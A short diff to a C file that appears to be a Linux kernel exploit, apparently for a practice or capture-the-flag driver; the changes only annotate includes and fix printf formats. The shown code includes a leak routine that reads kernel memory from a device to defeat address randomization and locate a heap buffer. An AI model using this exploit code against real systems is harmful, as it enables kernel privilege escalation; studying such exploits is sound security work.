@@ -1,9 +1,9 @@
-#include <fcntl.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/ioctl.h>
-#include <unistd.h>
+#include <fcntl.h>      // for open, O_NOCTTY, O_RDONLY, O_RDWR
+#include <inttypes.h>   // for uintptr_t, PRIx64, uint8_t
+#include <stdio.h>      // for perror, printf, NULL, puts
+#include <stdlib.h>     // for EXIT_FAILURE, EXIT_SUCCESS
+#include <sys/ioctl.h>  // for ioctl
+#include <unistd.h>     // for close, execve, read, write
 
 uintptr_t cs;
 uintptr_t rflags;
@@ -47,10 +47,10 @@ static void leak_offset_and_g_buf(int fd, uint8_t *data)
 	read(fd, data, 0x440);
 	ptr = *(uintptr_t *)&data[0x418];
 	offset = ptr - 0xffffffff81c38880;
-	printf("[+] offset %p\n", offset);
+	printf("[+] offset %#" PRIx64 "\n", offset);
 
 	g_buf = *(uintptr_t *)&data[0x438] - 0x438;
-	printf("[+] g_buf %p\n", g_buf);
+	printf("[+] g_buf %#" PRIx64 "\n", g_buf);
 }
 
 int main(void)
